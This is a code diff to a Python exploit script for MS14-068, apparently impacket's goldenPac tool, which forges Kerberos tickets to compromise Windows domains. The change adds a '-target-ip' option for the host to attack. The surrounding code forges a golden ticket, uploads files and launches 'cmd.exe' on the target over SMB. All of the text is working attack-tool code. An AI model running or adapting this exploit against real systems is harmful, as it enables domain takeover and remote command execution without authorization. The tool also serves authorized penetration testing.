@@ -610,7 +610,7 @@ class MS14_068():
             ('Data', PKERB_VALIDATION_INFO),
         )
 
-    def __init__(self, target, kdchost = None, username = '', password = '', domain='', hashes = None, command='', copyFile=None, writeTGT=None, kdcHost=None):
+    def __init__(self, target, targetIp = None, kdchost = None, username = '', password = '', domain='', hashes = None, command='', copyFile=None, writeTGT=None, kdcHost=None):
         self.__username = username
         self.__password = password
         self.__domain = domain
@@ -618,6 +618,7 @@ class MS14_068():
         self.__lmhash = ''
         self.__nthash = ''
         self.__target = target
+        self.__targetIp = targetIp
         self.__kdcHost = None
         self.__copyFile = copyFile
         self.__command = command
@@ -1066,7 +1067,10 @@ class MS14_068():
         TGS['sessionKey'] = sessionKeyCIFS
 
         from impacket.smbconnection import SMBConnection
-        s = SMBConnection('*SMBSERVER', self.__target)
+        if self.__targetIp is None:
+            s = SMBConnection('*SMBSERVER', self.__target)
+        else:
+            s = SMBConnection('*SMBSERVER', self.__targetIp)
         s.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, TGS=TGS, useCache=False)
 
         if self.__command != 'None':
@@ -1114,6 +1118,7 @@ if __name__ == '__main__':
     parser.add_argument('-c', action='store',metavar = "pathname",  help='uploads the filename for later execution, arguments are passed in the command option')
     parser.add_argument('-w', action='store',metavar = "pathname",  help='writes the golden ticket in CCache format into the <pathname> file')
     parser.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Adress of the domain controller you want to attack. If ommited it will be taken from the domain specified in the target parameter')
+    parser.add_argument('-target-ip', action='store',metavar = "ip address",  help='IP Adress target host you want to attack. If ommited it will use the targetName parameter')
 
     group = parser.add_argument_group('authentication')
 
@@ -1148,7 +1153,7 @@ if __name__ == '__main__':
     if commands == ' ':
         commands = 'cmd.exe'
 
-    dumper = MS14_068(address, None, username, password, domain, options.hashes, commands, options.c, options.w, options.dc_ip)
+    dumper = MS14_068(address, options.target_ip, None, username, password, domain, options.hashes, commands, options.c, options.w, options.dc_ip)
 
     try:
         dumper.exploit()
